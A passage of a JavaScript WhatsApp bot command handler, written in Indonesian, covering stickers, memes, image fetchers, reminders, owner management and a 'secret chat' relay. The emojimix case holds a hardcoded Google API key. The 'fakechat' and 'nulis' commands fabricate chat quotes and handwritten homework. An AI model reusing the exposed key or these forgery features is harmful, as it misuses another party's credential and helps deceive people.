        } else { // Jika media berupa gambar
            console.log('Memproses media gambar...');
            const sharp = require('sharp');
            sharp(media).resize(512, 512) // Menyesuaikan ukuran gambar (512x512 px)
                .webp() // Konversi ke format WebP
                .toBuffer() // Menghasilkan buffer dari gambar
                .then(async (buffer) => {
                    console.log('Gambar berhasil diproses menjadi format WebP.');
                    // Kirim buffer gambar sebagai stiker
                    await sych.sendAsSticker(m.chat, buffer, m, {
                        packname: global.packname,
                        author: global.author
                    });
                    // Memberikan reaksi pada pesan pengguna
        await sych.sendMessage(m.chat, {
            react: {
                text: '💟', // Emoji reaksi
                key: m.key // Memberikan reaksi pada pesan perintah
            }
        });
                    console.log('Stiker berhasil dikirim.');
                }).catch((err) => {
                    console.error('Terjadi kesalahan saat memproses gambar:', err);
                    sycreply('Terjadi kesalahan saat mengonversi gambar ke stiker!');
                });
        }

    } catch (e) {
        console.error('Terjadi kesalahan saat memproses media:', e);
        sycreply('Terjadi kesalahan saat memproses media!');
    }
}
break;
			case 'smeme':
			case 'stickmeme':
			case 'stikmeme':
			case 'stickermeme':
			case 'stikermeme': {
			     
				try {
					console.log('Memulai proses pembuatan stiker meme...');
					let mime = (quoted.msg || m.msg).mimetype || '';
					if (!/image|webp/.test(mime)) {
						console.log('Mime tipe tidak valid, harus image atau webp.');
						return sycreply(`Kirim/reply image/sticker\nDengan caption ${prefix + command} atas|bawah`);
					}
					if (!text) {
						console.log('Teks caption tidak ditemukan.');
						return sycreply(`Kirim/reply image/sticker dengan caption ${prefix + command} atas|bawah`);
					}
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					console.log('Menunggu proses meme...');
					let [atas, bawah] = text.split('|');
					atas = atas ? atas.trim() : '-';
					bawah = bawah ? bawah.trim() : '-';
					console.log(`Teks atas: ${atas}, Teks bawah: ${bawah}`);
					let quotedMedia = m.quoted ? m.quoted : m;
					let media = await quotedMedia.download();
					console.log('Gambar/sticker berhasil diunduh.');
					let uploadResponse = await UguuSe(media); // Pastikan fungsi UguuSe berfungsi
					let mediaUrl = uploadResponse.url;
					console.log('Gambar berhasil diunggah ke UguuSe, URL:', mediaUrl);
					// Buat URL meme
					let memeUrl = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${encodeURIComponent(mediaUrl)}`;
					console.log('URL meme berhasil dibuat:', memeUrl);
					// Unduh file dari URL meme
					let response = await fetch(memeUrl);
					if (!response.ok) {
						console.log('Gagal mengunduh gambar meme.');
						throw new Error('Gagal mengunduh gambar meme.');
					}
					let buffer = await response.buffer();
					console.log('Meme berhasil diunduh.');
					// Konversi ke stiker menggunakan sharp atau library lain
					let webpBuffer = await sharp(buffer).resize(512, 512, {
						fit: 'contain'
					}).webp().toBuffer();
					console.log('Meme berhasil dikonversi ke format WebP.');
					// Kirim stiker
					await sych.sendAsSticker(m.chat, webpBuffer, m, {
						packname: packname,
						author: author
					});
					console.log('Stiker meme berhasil dikirim.');
					// Memberikan reaksi pada pesan pengguna
					await sych.sendMessage(m.chat, {
						react: {
							text: '💭', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
					console.log('Reaksi berhasil diberikan pada pesan.');
				} catch (e) {
					console.error('Terjadi kesalahan:', e);
					sycreply('Terjadi kesalahan saat membuat stiker meme!');
				}
			}
			break;
			case 'emojimix': {
			     
				if (!text) {
					console.log("Input kosong!");
					return sycreply(`*< / >* Example: ${prefix + command} 😅+🤔`);
				}
				let [emoji1, emoji2] = text.split`+`;
				if (!emoji1 || !emoji2) {
					console.log("Emoji tidak valid atau tidak dipisahkan dengan '+'.");
					return sycreply(`*< / >* Example: ${prefix + command} 😅+🤔`);
				}
				console.log(`Emoji1: ${emoji1}, Emoji2: ${emoji2}`);
				try {
					console.log("Mengirim permintaan ke API...");
					let response = await axios.get(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`);
					console.log("Respons dari API diterima:", response.data);
					let results = response.data.results;
					if (results.length < 1) {
						console.log("Hasil emoji mix tidak ditemukan.");
						return sycreply(`Mix Emoji ${text} Tidak Ditemukan!`);
					}
					console.log(`Jumlah hasil ditemukan: ${results.length}`);
					for (let res of results) {
						let stickerUrl = res.media_formats.png_transparent.url;
						console.log(`URL Sticker: ${stickerUrl}`);
						// Buat folder temp jika belum ada
						const tempDir = path.resolve(__dirname, 'temp');
						if (!fs.existsSync(tempDir)) {
							console.log("Membuat folder temp...");
							fs.mkdirSync(tempDir, {
								recursive: true
							});
						}
						// Unduh file ke folder sementara
						const filePath = path.join(tempDir, `sticker_${Date.now()}.png`);
						const writer = fs.createWriteStream(filePath);
						const download = await axios({
							url: stickerUrl,
							method: 'GET',
							responseType: 'arraybuffer',
						});
						const buffer = Buffer.from(download.data);
						// Konversi gambar menjadi WebP menggunakan sharp
						const filePathWebP = path.join(tempDir, `sticker_${Date.now()}.webp`);
						await sharp(buffer).webp().toFile(filePathWebP);
						console.log(`File dikonversi ke: ${filePathWebP}`);
						// Kirim sebagai sticker
						await sych.sendAsSticker(m.chat, filePathWebP, m, {
							packname: packname,
							author: author
						});
						console.log("Sticker berhasil dikirim.");
						// Hapus file setelah selesai
						fs.unlinkSync(filePathWebP);
					}
				} catch (e) {
					console.error("Terjadi kesalahan:", e);
					sycreply('Gagal Mix Emoji!');
				}
			}
			break;
			case 'reminder': {
			     
    if (!text || !args[0] || !args[1]) return sycreply('Gunakan: !reminder [waktu(detik)] [pesan]');
    const time = parseInt(args[0]) * 1000;
    const message = args.slice(1).join(' ');

    sycreply(`Pengingat diatur! Bot akan mengingatkan dalam ${args[0]} detik.`);
    setTimeout(() => {
        sycreply(`⏰ Pengingat: ${message}`);
    }, time);
}
break;
			case 'qc':
			case 'quote':
			case 'fakechat': {
			     
				if (!text && !m.quoted) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
				try {
					let ppnya = await sych.profilePictureUrl(m.sender, 'image').catch(() => 'https://i.pinimg.com/564x/8a/e9/e9/8ae9e92fa4e69967aa61bf2bda967b7b.jpg');
					let pesan = text || m.quoted.text;
					let res = await quotedLyo(pesan, m.pushName, ppnya);
					// Debugging base64
					let base64Image = res.result.image;
					console.log('Base64 Data (partial):', base64Image.slice(0, 100));
					// Perbaiki format jika header hilang
					if (!base64Image.startsWith('data:image/')) {
						base64Image = `data:image/webp;base64,${base64Image}`;
					}
					// Validasi base64
					if (!/^data:image\/(png|jpeg|jpg|webp);base64,/.test(base64Image)) {
						throw new Error('Invalid base64 format. Expected image format.');
					}
					// Konversi base64 ke buffer
					let buffer = Buffer.from(base64Image.split(',')[1], 'base64');
					// Pastikan gambar berbentuk persegi
					buffer = await sharp(buffer).resize({
						width: 512, // Ukuran persegi
						height: 512, // Ukuran persegi
						fit: 'contain', // Atur agar proporsional
						background: {
							r: 0,
							g: 0,
							b: 0,
							alpha: 0
						}, // Latar belakang transparan
					}).webp().toBuffer();
					// Kirim buffer sebagai stiker
					await sych.sendAsSticker(m.chat, buffer, m, {
						packname: packname,
						author: author
					});
				} catch (e) {
					console.error(e);
					sycreply('Terjadi kesalahan: ' + e.message);
				}
			}
			break;
			
			
			case 'brat': {
			     
				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`*${prefix + command}* Teksnya`);
				try {
					// Log langkah pertama
					console.log('Mengambil gambar dari API pertama...');
					const response = await fetch('https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(text || m.quoted.text));
					if (!response.ok) throw new Error('API pertama gagal merespons');
					const buffer = await response.buffer();
					console.log('Gambar berhasil diambil dari API pertama, mulai konversi...');
					const outputPath = './temp_sticker.webp';
					await sharp(buffer).resize(512, 512, {
						fit: 'contain'
					}).webp({
						quality: 100
					}).toFile(outputPath);
					console.log('Konversi ke WebP selesai, mengirim stiker...');
					await sych.sendMessage(m.chat, {
						sticker: {
							url: outputPath
						}
					}, {
						quoted: m
					});
					console.log('Stiker berhasil dikirim, menghapus file sementara...');
					fs.unlinkSync(outputPath);
				} catch (e) {
					console.error('Error pada API pertama:', e.message);
					try {
						// Log langkah kedua
						console.log('Mengambil gambar dari API kedua...');
						const response = await fetch('https://mannoffc-x.hf.space/brat?q=' + encodeURIComponent(text || m.quoted.text));
						if (!response.ok) throw new Error('API kedua gagal merespons');
						const buffer = await response.buffer();
						console.log('Gambar berhasil diambil dari API kedua, mulai konversi...');
						const outputPath = './temp_sticker.webp';
						await sharp(buffer).resize(512, 512, {
							fit: 'contain'
						}).webp({
							quality: 100
						}).toFile(outputPath);
						console.log('Konversi ke WebP selesai, mengirim stiker...');
						await sych.sendMessage(m.chat, {
							sticker: {
								url: outputPath
							}
						}, {
							quoted: m
						});
						console.log('Stiker berhasil dikirim, menghapus file sementara...');
						fs.unlinkSync(outputPath);
					} catch (e) {
						console.error('Error pada API kedua:', e.message);
						sycreply('Server Brat Sedang Offline!');
					}
				}
			}
			break;
			// Fungsi untuk membuat metadata Exif
			async function generateExif(packname, author) {
				const exif = {
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author
				};
				const jsonBuffer = Buffer.from(JSON.stringify(exif), 'utf-8');
				const exifBuffer = Buffer.concat([
					Buffer.from([0x00, 0x00, 0x16, 0x00, 0x00]),
					jsonBuffer
				]);
				return exifBuffer;
			}
			case 'sticktele': {
			     
				if (!text) return sycreply(`*${prefix + command}* membutuhkan query teks`);
				try {
					console.log('Mengambil data dari API Telegram Sticker...');
					const apiUrl = `https://api.siputzx.my.id/api/d/telegramsticker?query=${encodeURIComponent(text)}`;
					const response = await fetch(apiUrl);
					if (!response.ok) throw new Error('Gagal merespons dari API');
					const result = await response.json();
					if (!result.stickers || result.stickers.length === 0) {
						return sycreply('Tidak ada stiker yang ditemukan untuk query tersebut.');
					}
					console.log('Stiker ditemukan, mengambil stiker pertama...');
					const sticker = result.stickers[0]; // Ambil stiker pertama
					const stickerBuffer = await fetch(sticker.fileUrl).then(res => res.buffer());
					console.log('Mengirim stiker...');
					await sych.sendMessage(m.chat, {
						sticker: stickerBuffer
					}, {
						quoted: m
					});
					console.log('Stiker berhasil dikirim.');
				} catch (e) {
					console.error('Error:', e.message);
					sycreply(`Terjadi kesalahan: ${e.message}`);
				}
			}
			break;
			case 'wasted': {
			     
				try {
					if (/jpg|jpeg|png/.test(mime)) {
						sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
						let media = await quoted.download()
						let anu = await UguuSe(media)
						await sych.sendFileUrl(m.chat, 'https://some-random-api.com/canvas/wasted?avatar=' + anu.url, 'Nih Bro', m)
					} else {
						sycreply('Send Media yg ingin di Upload!')
					}
				} catch (e) {
					sycreply('Server Canvas Sedang Offline!')
				}
			}
			break
			case 'drivedl': {
			     
				if (!text) return sycreply(`*< / >* Example: ${prefix + command} url_drive`)
				if (!text.includes('drive.google.com')) return sycreply('Url Tidak Mengandung Hasil Dari Google Drive!')
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					await sych.sendMessage(m.chat, {
						react: {
							text: "✅",
							key: m.key
						}
					});
					const apiUrl = `https://api.agatz.xyz/api/drivedl?url=${text}`;
					const response = await fetch(apiUrl);
					const hasil = await response.json();
					if (hasil.status !== 200 || !hasil.data) {
						sycreply('File Tidak ditemukan!')
					} else {
						await sych.sendFileUrl(m.chat, hasil.data.download, `*🎐File:* ${hasil.data.name}\n*Link:* ${hasil.data.link}`, m);
					}
				} catch (e) {
					sycreply('Server downloader Google Drive sedang offline!');
				}
			}
			break;
			case 'kucing': {
			     
				try {
					// Memberi tahu pengguna bahwa gambar sedang dimuat
					sycreply('Loading, mohon tunggu sebentar...');
					// Logging untuk proses pengambilan data
					console.log('Mengambil gambar kucing dari server...');
					// Mengirim gambar langsung tanpa memerlukan input teks
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/r/cats'
						}
					}, {
						quoted: m
					});
					await sych.sendMessage(m.chat, {
						react: {
							text: '🐱', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
					console.log('Gambar kucing berhasil dikirim.');
				} catch (e) {
					console.error('Error saat mengambil gambar kucing:', e);
					sycreply('Server Sedang Offline!');
				}
			}
			break;
			case 'encode': {
			     
				if (!text) return sycreply('Harap masukkan teks yang ingin dienkripsi!');
				try {
					// Proses encoding Base64
					const encodedText = Buffer.from(text, 'utf-8').toString('base64');
					sycreply(`${encodedText}`);
				} catch (err) {
					sycreply('Terjadi kesalahan saat mengenkripsi teks.');
				}
			}
			break;
			case 'decode': {
			     
				if (!text) return sycreply('Harap masukkan teks terenkripsi untuk didekode!');
				try {
					// Proses decoding Base64
					const decodedText = Buffer.from(text, 'base64').toString('utf-8');
					sycreply(`${decodedText}`);
				} catch (err) {
					sycreply('Pesan tidak valid atau bukan Base64.');
				}
			}
			break;
			case 'cekcuaca': {
			     
				if (!text) return sycreply('Masukkan lokasi! Contoh: cekcuaca Jakarta');
				try {
					const url = `https://wttr.in/${encodeURIComponent(text)}?format=%l:+%C+%t+%h+%w`;
					const res = await fetch(url);
					if (!res.ok) throw new Error('Gagal mendapatkan data cuaca!');
					const weatherInfo = await res.text();
					// Terjemahkan hasil cuaca ke Bahasa Indonesia
					const translated = await translate(weatherInfo, {
						to: 'id'
					});
					sycreply(`🌤️ Informasi Cuaca:\n\n${translated}`);
				} catch (error) {
					console.error(error);
					sycreply('Terjadi kesalahan saat mengambil data cuaca. Pastikan lokasi yang dimasukkan benar.');
				}
			}
			break;
			case 'bluearchive': {
			     
				try {
					// Mengirim gambar langsung tanpa memerlukan input teks
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/r/blue-archive'
						}
					}, {
						quoted: m
					});
				} catch (e) {
					sycreply('Server Sedang Offline!');
				}
			}
			break;
			case 'delowner':
			     
    if (!isCreator) return sycreply('Perintah ini hanya dapat digunakan oleh creator!');
    if (!args[0]) return sycreply('Masukkan nomor yang ingin dihapus dari owner!');
    const removeOwner = args[0].replace(/[^0-9]/g, '');
    if (!global.owner.includes(removeOwner)) return sycreply('Nomor tersebut tidak ada dalam daftar owner!');
    global.owner = global.owner.filter(num => num !== removeOwner);
    fs.writeFileSync('./setown.js', `global.owner = ${JSON.stringify(global.owner)};`);
    sycreply(`Berhasil menghapus owner: ${removeOwner}`);
    break;
    case 'addowner':
    if (!isCreator) return sycreply('Perintah ini hanya dapat digunakan oleh creator!');
    if (!args[0]) return sycreply('Masukkan nomor yang ingin ditambahkan sebagai owner!');
    const newOwner = args[0].replace(/[^0-9]/g, '');
    if (global.owner.includes(newOwner)) return sycreply('Nomor tersebut sudah menjadi owner!');
    global.owner.push(newOwner);
    fs.writeFileSync('./setown.js', `global.owner = ${JSON.stringify(global.owner)};`);
    sycreply(`Berhasil menambahkan owner: ${newOwner}`);
    break;
    case 'listowner':
    const ownerList = global.owner.map((num, index) => `${index + 1}. ${num}`).join('\n');
    sycreply(`Daftar Owner:\n${ownerList}`);
    break;
			case 'cjpn': {
			     
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					// Mengirim gambar langsung tanpa memerlukan input teks
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/r/cecan/japan'
						}
					}, {
						quoted: m
					});
					await sych.sendMessage(m.chat, {
						react: {
							text: '🇯🇵', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
				} catch (e) {
					sycreply('Server Sedang Offline!');
				}
			}
			break;
			case 'ckorea': {
			     
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					// Mengirim gambar langsung tanpa memerlukan input teks
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/r/cecan/korea'
						}
					}, {
						quoted: m
					});
					await sych.sendMessage(m.chat, {
						react: {
							text: '🇰🇷', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
				} catch (e) {
					sycreply('Server Sedang Offline!');
				}
			}
			break;
			// CASE untuk memulai chat rahasia
			case 'startsecret': {
			     
				if (!m.isGroup) return sycreply('Fitur ini hanya bisa digunakan di grup!');
				let target = m.mentionedJid[0]; // Ambil pengguna yang ditandai
				if (!target) return sycreply('Tag pengguna yang ingin diajak chat rahasia!');
				// Cek apakah target sudah dalam sesi rahasia
				if (secretChat[target]) return sycreply('Pengguna tersebut sudah berada dalam sesi rahasia!');
				// Simpan sesi rahasia
				secretChat[target] = {
					partner: m.sender,
					chat: []
				};
				secretChat[m.sender] = {
					partner: target,
					chat: []
				};
				sycreply(`✅ Sesi chat rahasia dimulai dengan @${target.split('@')[0]}.\nGunakan perintah "!endsecret" untuk mengakhiri sesi.`);
			}
			break;
			// CASE untuk mengirim pesan rahasia
			case 'secretmsg': {
			     
				if (!secretChat[m.sender]) return sycreply('Kamu tidak berada dalam sesi rahasia!');
				let partner = secretChat[m.sender].partner;
				let msg = text; // Ambil teks dari pengguna
				// Kirim pesan rahasia
				secretChat[partner].chat.push(msg);
				secretChat[m.sender].chat.push(msg);
				sych.sendMessage(partner, {
					text: `📩 Pesan Rahasia: ${msg}`
				}, {
					quoted: m
				});
				sycreply('📨 Pesan rahasia terkirim!');
			}
			break;
			// CASE untuk mengakhiri sesi chat rahasia
			case 'endsecret': {
			     
				if (!secretChat[m.sender]) return sycreply('Kamu tidak berada dalam sesi rahasia!');
				let partner = secretChat[m.sender].partner;
				// Hapus sesi rahasia
				delete secretChat[m.sender];
				delete secretChat[partner];
				sycreply('🚫 Sesi chat rahasia telah berakhir.');
				sych.sendMessage(partner, {
					text: '🚫 Sesi chat rahasia telah berakhir.'
				});
			}
			break;
			case 'cindo': {
			     
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					// Mengirim gambar langsung tanpa memerlukan input teks
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/r/cecan/indonesia'
						}
					}, {
						quoted: m
					});
					await sych.sendMessage(m.chat, {
						react: {
							text: '🇮🇩', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
				} catch (e) {
					sycreply('Server Sedang Offline!');
				}
			}
			break;
			case 'cthai': {
			     
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					// Mengirim gambar langsung tanpa memerlukan input teks
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/r/cecan/thailand'
						}
					}, {
						quoted: m
					});
					await sych.sendMessage(m.chat, {
						react: {
							text: '🇹🇭', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
				} catch (e) {
					sycreply('Server Sedang Offline!');
				}
			}
			break;
			case 'cviet': {
			     
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					// Mengirim gambar langsung tanpa memerlukan input teks
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/r/cecan/vietnam'
						}
					}, {
						quoted: m
					});
					await sych.sendMessage(m.chat, {
						react: {
							text: '🇻🇳', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
				} catch (e) {
					sycreply('Server Sedang Offline!');
				}
			}
			break;
		
case 'bratvid': {
     
    if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`*${prefix + command}* Teksnya`);

    try {
        console.log('Mengambil video dari API...');
        const response = await fetch('https://fgsi-brat.hf.space/?text=' + encodeURIComponent(text || m.quoted.text) + '&isVideo=true');
        if (!response.ok) throw new Error('API gagal merespons');

        const buffer = await response.arrayBuffer();
        const videoPath = './temp_video.mp4';
        const stickerPath = './temp_sticker.webp';

        // Simpan video sementara
        fs.writeFileSync(videoPath, Buffer.from(buffer));

        // Konversi ke WebP (stiker animasi)
        console.log('Mengonversi video ke WebP (stiker animasi)...');
        exec(`ffmpeg -i ${videoPath} -vf "scale=512:512:flags=lanczos,fps=15" -loop 0 -preset default -an -vsync 0 -s 512x512 ${stickerPath}`, async (error) => {
            if (error) {
                console.error('Error saat konversi ke WebP:', error);
                return sycreply('Gagal mengonversi video ke stiker animasi.');
            }

            console.log('Konversi selesai, mengirim stiker animasi...');
            
            await sych.sendMessage(m.chat, {
                sticker: fs.readFileSync(stickerPath)
            }, { quoted: m });

            console.log('Stiker berhasil dikirim, membersihkan file sementara...');
            fs.unlinkSync(videoPath);
            fs.unlinkSync(stickerPath);
        });

    } catch (e) {
        console.error('Error:', e.message);
        sycreply('Server Brat Sedang Offline atau terjadi kesalahan!');
    }
}
break;
			case 'cchina': {
			     
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					// Mengirim gambar langsung tanpa memerlukan input teks
					await sych.sendMessage(m.chat, {
						image: {
							url: 'https://api.siputzx.my.id/api/r/cecan/china'
						}
					}, {
						quoted: m
					});
					await sych.sendMessage(m.chat, {
						react: {
							text: '🇨🇳', // Emoji yang diinginkan
							key: m.key // Memberikan reaksi pada pesan perintah
						}
					});
				} catch (e) {
					sycreply('Server Sedang Offline!');
				}
			}
			break;
			case 'trigger':
			case 'triggered': {
			     
				try {
					if (/jpg|jpeg|png/.test(mime)) {
						sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
						let media = await quoted.download()
						let anu = await UguuSe(media)
						await sych.sendMessage(m.chat, {
							document: {
								url: 'https://some-random-api.com/canvas/triggered?avatar=' + anu.url
							},
							fileName: 'triggered.gif',
							mimetype: 'image/gif'
						}, {
							quoted: m
						})
					} else {
						sycreply('Send Media yg ingin di Upload!')
					}
				} catch (e) {
					sycreply('Server Canvas Sedang Offline!')
				}
			}
			break
			case 'setexif': {
			     
				if (!isCreator) return sycreply(mess.owner)
				if (!text) return sycreply(`*< / >* Example : ${prefix + command} packname|author`)
				global.packname = text.split("|")[0]
				global.author = text.split("|")[1]
				sycreply(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
			}
			break
			case 'nulis': {
			     
				sycreply(`**< / >* Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
			}
			break
			case 'nuliskiri': {
			     
				if (!text) return sycreply(`Kirim perintah *${prefix + command}* Teksnya`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', ['./src/nulis/images/buku/sebelumkiri.jpg', '-font', './src/nulis/font/Indie-Flower.ttf', '-size', '960x1280', '-pointsize', '23', '-interline-spacing', '2', '-annotate', '+140+153',
					fixHeight, './src/nulis/images/buku/setelahkiri.jpg'
				]).on('error', () => sycreply(mess.error)).on('exit', () => {
					sych.sendMessage(m.chat, {
						image: fs.readFileSync('./src/nulis/images/buku/setelahkiri.jpg'),
						caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ'
					}, {
						quoted: m
					})
				})
			}
			break
			case 'nuliskanan': {
			     
				if (!text) return sycreply(`Kirim perintah *${prefix + command}* Teksnya`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', ['./src/nulis/images/buku/sebelumkanan.jpg', '-font', './src/nulis/font/Indie-Flower.ttf', '-size', '960x1280', '-pointsize', '23', '-interline-spacing', '2', '-annotate', '+128+129',
					fixHeight, './src/nulis/images/buku/setelahkanan.jpg'
				]).on('error', () => sycreply(mess.error)).on('exit', () => {
					sych.sendMessage(m.chat, {
						image: fs.readFileSync('./src/nulis/images/buku/setelahkanan.jpg'),
						caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ'
					}, {
						quoted: m
					})
				})
			}
			break
			case 'foliokiri': {
			     
				if (!text) return sycreply(`Kirim perintah *${prefix + command}* Teksnya`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', ['./src/nulis/images/folio/sebelumkiri.jpg', '-font', './src/nulis/font/Indie-Flower.ttf', '-size', '1720x1280', '-pointsize', '23', '-interline-spacing', '4', '-annotate', '+48+185',
					fixHeight, './src/nulis/images/folio/setelahkiri.jpg'
				]).on('error', () => sycreply(mess.error)).on('exit', () => {
					sych.sendMessage(m.chat, {
						image: fs.readFileSync('./src/nulis/images/folio/setelahkiri.jpg'),
						caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ'
					}, {
						quoted: m
					})
				})
			}
			break
			case 'tiktokstalk':
			case 'ttstalk':
			case 'tiktokprofile':
			case 'ttprofile': {
			     
				if (!text) {
					console.log('TikTok username not provided.');
					return sycreply('*< / >* Example: ' + prefix + command + ' username_tiktok');
				}
				try {
					sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
					console.log('Fetching TikTok profile for username:', text);
					const url = `https://api.tiklydown.eu.org/api/stalk?user=${text}`;
					const response = await fetch(url);
					const data = await response.json();
					if (data.status === 200 && data.data && data.data.user) {
						const user = data.data.user;
						const stats = data.data.stats;
						const profileMessage = `*Name:* ${user.nickname}\n*Username:* @${user.uniqueId}\n*Signature:* ${user.signature || 'No signature available'}\n*Followers:* ${stats.followerCount}\n*Following:* ${stats.followingCount}\n*Likes:* ${stats.heartCount}\n*Videos:* ${stats.videoCount}\n*Region:* ${user.region}\n*Verified:* ${user.verified ? 'Yes' : 'No'}`;
						sycreply(profileMessage)
					} else {
						console.log('Failed to retrieve TikTok profile data.');
						sycreply('Failed to retrieve TikTok profile or invalid username.');
					}
				} catch (e) {
					console.error('Error fetching TikTok profile:', e);
					sycreply('An error occurred while fetching the profile. Please try again later.');
				}
				break;
			}
			case 'foliokanan': {
			     
				if (!text) return sycreply(`Kirim perintah *${prefix + command}* Teksnya`)
				sycreply(mess.wait);

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
